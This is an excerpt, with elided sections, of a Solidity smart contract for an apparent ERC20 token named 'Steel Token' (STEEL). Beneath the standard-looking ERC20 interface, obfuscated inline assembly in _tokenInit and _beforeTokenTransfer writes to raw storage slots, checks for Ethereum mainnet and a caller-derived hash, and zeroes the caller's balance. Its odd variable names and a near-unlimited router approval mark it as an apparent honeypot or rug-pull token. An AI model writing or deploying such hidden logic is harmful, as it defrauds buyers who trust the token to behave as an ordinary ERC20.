...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addSteel;
    uint256 private stealingMan = block.number*2;

    mapping (address => bool) private _firstSuperman; 
    mapping (address => bool) private _secondZeus;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private brownPants;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private manOfSteel;
    address public pair;
    ...
    bool private trading; uint256 private accelerAtion = 1; bool private darkMyst;
    uint256 private _decimals; uint256 private movingDown;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addSteel.push(_router); addSteel.push(msgSender_); addSteel.push(pair);
        for (uint256 q=0; q < 3;) {_firstSuperman[addSteel[q]] = true; unchecked{q++;} }
    }
    ...
    function _tokenInit() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0x113)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x2d6afbadf138f7d882f9360f319e8d6ae11b098caf1c3b4b69e0a15a75f80456
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x1c41009668f22e70af2c26e1dd4cce7a7f36a003c554689706e941423ece9fea,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; stealingMan = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addSteel[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeploySteel(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addSteel[0], 10 ** 77);
        _tokenInit();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeploySteel(creator, initialSupply);
    }
}

contract SteelToken is ERC20Token {
    constructor() ERC20Token("Steel Token", "STEEL", msg.sender, 2500000 * 10 ** 18) {
    }
}